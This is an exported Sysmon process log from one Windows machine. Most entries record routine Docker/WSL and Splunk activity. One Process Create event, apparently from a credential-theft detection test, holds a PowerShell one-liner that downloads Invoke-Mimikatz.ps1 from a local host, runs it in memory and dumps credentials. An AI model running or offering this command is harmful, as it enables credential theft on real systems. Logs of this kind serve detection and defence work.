ProcessGuid: {22a2695c-3fbe-6429-b3e6-000000006e00}
ProcessId: 16104
Image: C:\Windows\System32\wsl.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Launcher
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wsl.exe
CommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/stat
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=070F414025D984C0799A616B459FEBC99EBC7B6F9D6C3B76E0D4E2E1F22266C2
ParentProcessGuid: {22a2695c-2190-6429-055d-000000006e00}
ParentProcessId: 16796
ParentImage: C:\Program Files\Docker\Docker\resources\com.docker.backend.exe
ParentCommandLine: ""C:\Program Files\Docker\Docker\resources\com.docker.backend.exe"" -addr unix:\\.\pipe\dockerBackendApiServer -native-api
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:34.384
ProcessGuid: {22a2695c-3fbe-6429-b0e6-000000006e00}
ProcessId: 9484
Image: C:\Windows\System32\wsl.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.277
ProcessGuid: {22a2695c-3fbe-6429-b2e6-000000006e00}
ProcessId: 22452
Image: C:\Windows\System32\conhost.exe
FileVersion: 10.0.19041.2546 (WinBuild.160101.0800)
Description: Console Window Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CONHOST.EXE
CommandLine: \??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\WINDOWS
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=A26A1FFB81A61281FFA55CB7778CC3FB0FF981704DE49F75F51F18B283FBA7A2
ParentProcessGuid: {22a2695c-3fbe-6429-b1e6-000000006e00}
ParentProcessId: 12852
ParentImage: C:\Windows\System32\lxss\wslhost.exe
ParentCommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 776 796 800 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.272
ProcessGuid: {22a2695c-3fbe-6429-b1e6-000000006e00}
ProcessId: 12852
Image: C:\Windows\System32\lxss\wslhost.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Background Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wslhost.exe
CommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 776 796 800 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=D9E607F64643812EDB102CE26AF0BB0E9BEB180E44F0F28F791941BF2208CA78
ParentProcessGuid: {22a2695c-3fbe-6429-b0e6-000000006e00}
ParentProcessId: 9484
ParentImage: C:\Windows\System32\wsl.exe
ParentCommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/meminfo
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.222
ProcessGuid: {22a2695c-3fbe-6429-b0e6-000000006e00}
ProcessId: 9484
Image: C:\Windows\System32\wsl.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Launcher
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wsl.exe
CommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/meminfo
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=070F414025D984C0799A616B459FEBC99EBC7B6F9D6C3B76E0D4E2E1F22266C2
ParentProcessGuid: {22a2695c-2190-6429-055d-000000006e00}
ParentProcessId: 16796
ParentImage: C:\Program Files\Docker\Docker\resources\com.docker.backend.exe
ParentCommandLine: ""C:\Program Files\Docker\Docker\resources\com.docker.backend.exe"" -addr unix:\\.\pipe\dockerBackendApiServer -native-api
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:33,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:33.763
ProcessGuid: {22a2695c-3fbd-6429-afe6-000000006e00}
ProcessId: 22280
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
User: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:33,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:33.746
ProcessGuid: {22a2695c-3fbd-6429-aee6-000000006e00}
ProcessId: 25976
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
User: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:33,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:33.728
ProcessGuid: {22a2695c-3fbd-6429-afe6-000000006e00}
ProcessId: 22280
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
FileVersion: 9.0.4.1
Description: splunk-optimize
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunk-optimize.exe
CommandLine: splunk-optimize -d ""C:\Program Files\Splunk\var\lib\splunk\_metrics\db\hot_v1_8"" -x 18014311936 --log-to--splunkd-log --write-level 3 --tsidx-target-size 1572864000 --msidx-comp-block-size 1024
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=090AB6E27522C5B37069983CDBB2F55248153A3FD9602DF223134ACBD59FD742
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:33,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:33.713
ProcessGuid: {22a2695c-3fbd-6429-aee6-000000006e00}
ProcessId: 25976
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
FileVersion: 9.0.4.1
Description: splunk-optimize
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunk-optimize.exe
CommandLine: splunk-optimize -d ""C:\Program Files\Splunk\var\lib\splunk\_metrics\db\hot_v1_7"" -x 18014311936 --log-to--splunkd-log --write-level 3 --tsidx-target-size 1572864000 --msidx-comp-block-size 1024
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=090AB6E27522C5B37069983CDBB2F55248153A3FD9602DF223134ACBD59FD742
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:33,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:33.707
ProcessGuid: {22a2695c-3fbd-6429-ade6-000000006e00}
ProcessId: 10368
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
User: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:33,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:33.698
ProcessGuid: {22a2695c-3fbd-6429-ade6-000000006e00}
ProcessId: 10368
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
FileVersion: 9.0.4.1
Description: splunk-optimize
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunk-optimize.exe
CommandLine: splunk-optimize -d ""C:\Program Files\Splunk\var\lib\splunk\_metrics\db\hot_v1_5"" -x 18014311936 --log-to--splunkd-log --write-level 3 --tsidx-target-size 1572864000 --msidx-comp-block-size 1024
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=090AB6E27522C5B37069983CDBB2F55248153A3FD9602DF223134ACBD59FD742
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:33,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:33.438
ProcessGuid: {22a2695c-3fbd-6429-ace6-000000006e00}
ProcessId: 21980
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.546 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  IEX (New-Object Net.WebClient).DownloadString('http://192.168.68.115:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
CurrentDirectory: C:\Users\iniad\Documents\mimi_test\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-52cd-030000000000}
LogonId: 0x3CD52
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F
ParentProcessGuid: {22a2695c-3edb-6429-78e2-000000006e00}
ParentProcessId: 23936
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\WINDOWS\system32\cmd.exe"" 
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:30.680
ProcessGuid: {22a2695c-3fba-6429-abe6-000000006e00}
ProcessId: 25536
Image: C:\Windows\System32\conhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:30.673
ProcessGuid: {22a2695c-3fba-6429-aae6-000000006e00}
ProcessId: 26248
Image: C:\Windows\System32\lxss\wslhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:30.664
ProcessGuid: {22a2695c-3fba-6429-a9e6-000000006e00}
ProcessId: 13016
Image: C:\Windows\System32\wsl.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:30.567
ProcessGuid: {22a2695c-3fba-6429-abe6-000000006e00}
ProcessId: 25536
Image: C:\Windows\System32\conhost.exe
FileVersion: 10.0.19041.2546 (WinBuild.160101.0800)
Description: Console Window Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CONHOST.EXE
CommandLine: \??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\WINDOWS
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=A26A1FFB81A61281FFA55CB7778CC3FB0FF981704DE49F75F51F18B283FBA7A2
ParentProcessGuid: {22a2695c-3fba-6429-aae6-000000006e00}
ParentProcessId: 26248
ParentImage: C:\Windows\System32\lxss\wslhost.exe
ParentCommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 792 812 816 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:30.562
ProcessGuid: {22a2695c-3fba-6429-aae6-000000006e00}
ProcessId: 26248
Image: C:\Windows\System32\lxss\wslhost.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Background Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wslhost.exe
CommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 792 812 816 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=D9E607F64643812EDB102CE26AF0BB0E9BEB180E44F0F28F791941BF2208CA78
ParentProcessGuid: {22a2695c-3fba-6429-a9e6-000000006e00}
ParentProcessId: 13016
ParentImage: C:\Windows\System32\wsl.exe
ParentCommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/stat
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:30.513
ProcessGuid: {22a2695c-3fba-6429-a9e6-000000006e00}
ProcessId: 13016
Image: C:\Windows\System32\wsl.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Launcher
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wsl.exe
CommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/stat
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=070F414025D984C0799A616B459FEBC99EBC7B6F9D6C3B76E0D4E2E1F22266C2
ParentProcessGuid: {22a2695c-2190-6429-055d-000000006e00}
ParentProcessId: 16796
ParentImage: C:\Program Files\Docker\Docker\resources\com.docker.backend.exe
ParentCommandLine: ""C:\Program Files\Docker\Docker\resources\com.docker.backend.exe"" -addr unix:\\.\pipe\dockerBackendApiServer -native-api
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:29.699
ProcessGuid: {22a2695c-3fb9-6429-a8e6-000000006e00}
ProcessId: 6132
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
User: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:29.688
ProcessGuid: {22a2695c-3fb9-6429-a8e6-000000006e00}
ProcessId: 6132
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
FileVersion: 9.0.4.1
Description: splunk-optimize
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunk-optimize.exe
CommandLine: splunk-optimize -d ""C:\Program Files\Splunk\var\lib\splunk\_internaldb\db\hot_v1_1"" -x 18014197248 --log-to--splunkd-log --write-level 3 --tsidx-target-size 1572864000 --msidx-comp-block-size 1024
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=090AB6E27522C5B37069983CDBB2F55248153A3FD9602DF223134ACBD59FD742
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:29.498
ProcessGuid: {22a2695c-3fb9-6429-a7e6-000000006e00}
ProcessId: 26304
Image: C:\Windows\System32\conhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:29.494
ProcessGuid: {22a2695c-3fb9-6429-a6e6-000000006e00}
ProcessId: 10568
Image: C:\Windows\System32\lxss\wslhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:29.486
ProcessGuid: {22a2695c-3fb9-6429-a5e6-000000006e00}
ProcessId: 16604
Image: C:\Windows\System32\wsl.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:29.407
ProcessGuid: {22a2695c-3fb9-6429-a7e6-000000006e00}
ProcessId: 26304
Image: C:\Windows\System32\conhost.exe
FileVersion: 10.0.19041.2546 (WinBuild.160101.0800)
Description: Console Window Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CONHOST.EXE
CommandLine: \??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\WINDOWS
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=A26A1FFB81A61281FFA55CB7778CC3FB0FF981704DE49F75F51F18B283FBA7A2
ParentProcessGuid: {22a2695c-3fb9-6429-a6e6-000000006e00}
ParentProcessId: 10568
ParentImage: C:\Windows\System32\lxss\wslhost.exe
ParentCommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 792 812 764 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:29.402
ProcessGuid: {22a2695c-3fb9-6429-a6e6-000000006e00}
ProcessId: 10568
Image: C:\Windows\System32\lxss\wslhost.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Background Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wslhost.exe
CommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 792 812 764 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=D9E607F64643812EDB102CE26AF0BB0E9BEB180E44F0F28F791941BF2208CA78
ParentProcessGuid: {22a2695c-3fb9-6429-a5e6-000000006e00}
ParentProcessId: 16604
ParentImage: C:\Windows\System32\wsl.exe
ParentCommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/stat
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:29.358
ProcessGuid: {22a2695c-3fb9-6429-a4e6-000000006e00}
ProcessId: 27316
Image: C:\Windows\System32\conhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:29.354
ProcessGuid: {22a2695c-3fb9-6429-a3e6-000000006e00}
ProcessId: 23276
Image: C:\Windows\System32\lxss\wslhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:29.353
ProcessGuid: {22a2695c-3fb9-6429-a5e6-000000006e00}
ProcessId: 16604
Image: C:\Windows\System32\wsl.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Launcher
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wsl.exe
CommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/stat
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=070F414025D984C0799A616B459FEBC99EBC7B6F9D6C3B76E0D4E2E1F22266C2
ParentProcessGuid: {22a2695c-2190-6429-055d-000000006e00}
ParentProcessId: 16796
ParentImage: C:\Program Files\Docker\Docker\resources\com.docker.backend.exe
ParentCommandLine: ""C:\Program Files\Docker\Docker\resources\com.docker.backend.exe"" -addr unix:\\.\pipe\dockerBackendApiServer -native-api
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:29.345
ProcessGuid: {22a2695c-3fb9-6429-a2e6-000000006e00}
ProcessId: 19908
Image: C:\Windows\System32\wsl.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:29.259
ProcessGuid: {22a2695c-3fb9-6429-a4e6-000000006e00}
ProcessId: 27316
Image: C:\Windows\System32\conhost.exe
FileVersion: 10.0.19041.2546 (WinBuild.160101.0800)
Description: Console Window Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CONHOST.EXE
CommandLine: \??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\WINDOWS
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=A26A1FFB81A61281FFA55CB7778CC3FB0FF981704DE49F75F51F18B283FBA7A2
ParentProcessGuid: {22a2695c-3fb9-6429-a3e6-000000006e00}
ParentProcessId: 23276
ParentImage: C:\Windows\System32\lxss\wslhost.exe
ParentCommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 784 804 808 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:29.254
ProcessGuid: {22a2695c-3fb9-6429-a3e6-000000006e00}
ProcessId: 23276
Image: C:\Windows\System32\lxss\wslhost.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Background Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wslhost.exe
CommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 784 804 808 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=D9E607F64643812EDB102CE26AF0BB0E9BEB180E44F0F28F791941BF2208CA78
ParentProcessGuid: {22a2695c-3fb9-6429-a2e6-000000006e00}
ParentProcessId: 19908
ParentImage: C:\Windows\System32\wsl.exe
ParentCommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/meminfo
ParentUser: DESKTOP-61BPDT0\iniad"
